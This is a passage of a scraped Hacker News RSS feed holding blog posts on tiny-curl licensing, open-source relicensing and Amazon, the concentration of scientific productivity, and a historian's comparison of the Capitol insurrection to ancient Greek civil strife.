<p>We‚Äôve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can‚Äôt even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven‚Äôt ported the ‚Äúnormal‚Äù curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don‚Äôt realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven‚Äôt explored much yet is the ability to make and offer ‚Äúreserved features‚Äù to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788122</guid>
            <pubDate>Fri, 15 Jan 2021 07:49:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The problem with Amazon and Open Source isn‚Äôt Amazon (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787965">thread link</a>) | @pabs3
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/ | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2019-06-07T12:23:10-07:00">June 07, 2019</time></p>
          
          
            <p> 




  5 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <figure>

<p><a href="https://www.flickr.com/photos/elainegreycats/5979877429/sizes/m/"><img src="https://live.staticflickr.com/6122/5979877429_6b7db5903a.jpg" alt="Wrong Way" width="500" height="333"></a>
</p><figcaption>‚ÄòWrong Way‚Äô by Elaine with Grey Cats on Flickr; CC-BY</figcaption></figure>

<p><em>Recently a friend wrote asking me ‚Äúwhat‚Äôs up with Amazon and open source?‚Äù and ‚Äúis there a chance these new licenses will be approved by OSI?‚Äù What follows is my reply.</em></p>

<hr>

<p>There‚Äôs been a rash of open source project relicensing happening the past few months, and in nearly every case the company making the licensing change is claiming that that they‚Äôre doing it to protect the project in question from Amazon.</p>

<p>That is a big steaming pile of bullshit.</p>

<p>First of all: There is absolutely <em>nothing</em> wrong with how Amazon is using these open source projects. They are operating completely and entirely within the bounds of the licenses of the projects. Fingers need to be wagged here, but not at Amazon.</p>

<p>These projects are not being relicensed to protect them from Amazon. Claiming that they are is at best naive and at worst wilfully lying. These companies are relicensing projects to cover for the fact that they are ignorant of how to run a successful business. They knowingly released their secret sauce under permissive licenses and have discovered that doing so means that competitors can create more compelling product offerings based upon the same technology. This is entirely in accordance not only with the licenses that these companies knowingly chose, but also with a competitive market. The only problem with this is that it came as a surprise to these ‚Äúopen source‚Äù companies and now they‚Äôre reacting poorly.</p>

<p>If these companies actually cared about the <em>projects</em>, they would have invested the resources to build stronger communities around them. They would have reached out to Amazon, encouraged them to contribute back to the projects, and helped them to do so. They would NOT have taken the few community contributions‚Äîand you will find that most of these projects do not have many contributions from outside of the originating company, showing how poorly they managed their communities‚Äîthey would not have taken these contributions from community members and then locked them behind proprietary licenses, violating the trust of their community.</p>

<p>You will find that none of the companies that have relicensed their projects address any of these issues. They don‚Äôt discuss how they tried to engage Amazon in their communities, how their attempts fell on deaf ears or were rebuffed. They can‚Äôt do this because thus far there is no evidence to show they even tried. I know a lot of the <a href="https://aws.amazon.com/blogs/opensource/">open source leadership at Amazon</a>. They‚Äôre good people who care deeply about free and open source and who are working to do the right thing by all of the communities of the projects they build upon. They would have been very open to hearing how they could make a positive difference in those communities. They‚Äôre a relatively few people across a very large company, so it may have taken a bit more time to get those contribution balls rolling, but they would have worked very hard to do so‚Ä¶had they been approached.</p>

<p>So don‚Äôt fall into the trap of unquestionably believing the recent spate of anti-Amazon propaganda. It comes from, without exception, companies that simply do not appear to understand how to operate successful businesses. From what I can tell, they‚Äôve received poor advice from their VCs. Not knowing any better, they understandably followed this advice and now they‚Äôre paying the price.</p>

<p>As far as whether there‚Äôs any chance these new licenses will be OSI approved, I answer a pretty definitive ‚Äúno.‚Äù There are two reasons for this. First of all, these companies would have to <a href="https://opensource.org/approval">submit the licenses for review</a>. OSI does not just go looking for licenses to review. License creators must take the action to say, ‚ÄúHey, this is a new license that we believe adheres to the <a href="https://opensource.org/osd-annotated">Open Source Definition</a>. It‚Äôs valuable to us and to the community that it be recognised as such. Could you please review it and confirm that?‚Äù So far only one company has tried that and they failed to get their license approved, because of the second reason‚Ä¶</p>

<p>In order to become OSI-approved, licenses must adhere to the <a href="https://opensource.org/osd-annotated">Open Source Definition (OSD)</a>. These new licenses do not. While the ways they diverge from the OSD are varied, the most common ones are that they violate either ‚Äú6. No Discrimination Against Fields of Endeavor‚Äù, ‚Äú8. License Must Not Be Specific to a Product‚Äù, ‚Äú9. License Must Not Restrict Other Software‚Äù, or ‚Äú10. License Must Be Technology-Neutral‚Äù.</p>

<p>#6 is the one most violated by these licenses. Restricting to non-commercial usage is fundamentally against the spirit of free and open source software. From the very beginning, Stallman himself was very emphatic that people be allowed to make money from free software. He and FOSS leaders after him realised that preventing people from making money from free and open source software will doom the movement. It is vitally important to FOSS that people be encouraged to use it in commercial and for-profit ventures. This will help foster the spread of FOSS. These licenses disregard both that and the benefit of this clause of the OSD to the whole of FOSS in preference to their own singular commercial needs.</p>

<p>In fact, the vibrant cloud-based and cloud-native environment within which most software companies operate now and which makes so much innovation possible (including that of these misled companies), exists because companies have released their technologies under OSI-approved licenses and have come together to collaborate on common and powerful tools. This is the culture that successful companies embrace. Even Microsoft, the former nemesis of free and open source, recognizes that this type of collaboration is critical to the continued growth and evolution of the company.</p>

<p>To be perfectly clear: There is nothing wrong with making money from software, FOSS or otherwise. Choosing to use a proprietary license for software is a valid business decision and one I support. Choosing to use an <a href="https://opensource.org/licenses">OSI-approved license</a> is an equally valid business decision and, again, one I support. However the license to choose for the software created by your company is just that: a <em>BUSINESS</em> decision.</p>

<p>There are many potential variables to consider and those variables will be different for each company, but ‚Äúhow will we make enough money from this to maintain and grow the company sustainably?‚Äù is one that is consistent across all of these decisions. If a company‚Äôs answer to that is, ‚Äúwe‚Äôll just give away the software to bring in leads‚Äù but they don‚Äôt have a compelling enough commercial offering on top of that to convert those leads to sales, while their competitor converts those leads and more using the same technology, that is NOT the fault of open source software, licensing, or culture. That‚Äôs a company that doesn‚Äôt understand how to do business, and blaming Amazon isn‚Äôt going to change that.</p>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787965</guid>
            <pubDate>Fri, 15 Jan 2021 07:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newton hypothesis: Is science done by a small elite?]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 93 (<a href="https://news.ycombinator.com/item?id=25787745">thread link</a>) | @barry-cotter
<br/>
January 14, 2021 | https://nintil.com/newton-hypothesis | <a href="https://web.archive.org/web/*/https://nintil.com/newton-hypothesis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to ‚Äìif given the time and means‚Äìlead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers ‚Äî the extended membership of the Planck Club ‚Äî during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>‚ÄúBut when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation‚Äôs budget for physics.‚Äù</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincar√©, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of ‚Ä¶</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/newton-hypothesis">https://nintil.com/newton-hypothesis</a></em></p>]]>
            </description>
            <link>https://nintil.com/newton-hypothesis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787745</guid>
            <pubDate>Fri, 15 Jan 2021 06:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Insurrections, Ancient and Modern (and Also Meet the Academicats)]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25787594">thread link</a>) | @parsecs
<br/>
January 14, 2021 | https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>



<figure><img data-attachment-id="5936" data-permalink="https://acoup.blog/pxl_20210114_215722402/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610643442&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1117&quot;,&quot;shutter_speed&quot;:&quot;0.041667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210114_215722402" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver (left) and Percival (right) seen here occupying the Pedant‚Äôs <a href="https://acoup.blog/category/fireside/">Fireside Chair</a>.</figcaption></figure>



<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don‚Äôt particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife ‚Äì <em>stasis</em> ‚Äì in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I‚Äôm going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators ‚Äì some deluded, some acting in bad faith ‚Äì attempting to insist that this wasn‚Äôt serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), ‚ÄúIn the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.‚Äù</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‚Äòc‚Äô is hard, so Ki-lon ‚Äì or if you prefer the Greek, Ku-lon ‚Äì not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon‚Äôs effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‚ÄòFour Hundred‚Äô would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> ‚Äì it‚Äôs council (Thuc. 8.69).  <strong>That‚Äôs four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way ‚Äì that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos‚Äô band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we‚Äôll come back to it).  Peisistratos‚Äô second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn‚Äôt mean it can‚Äôt work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‚Äòcensorship‚Äô on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean ‚Äì but true ‚Äì words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‚Äòfools‚Äô and ‚Äòenemies‚Äô ‚Äì fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>



<figure><img data-attachment-id="5938" data-permalink="https://acoup.blog/pxl_20210110_223238849-mp_/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610299958&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1919&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210110_223238849.mp_" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver, acting as my loyal research assistant.</figcaption></figure>



<h2>This Is Not Over</h2>



<p>Let‚Äôs come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We‚Äôve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles ‚Äì someone we might term an ‚Äòestablishment‚Äô figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn‚Äôt the end of the matter. Peisistratos, once out of power again used his wealth and support ‚Äì often foreign support, we are told ‚Äì to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos‚Äô partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



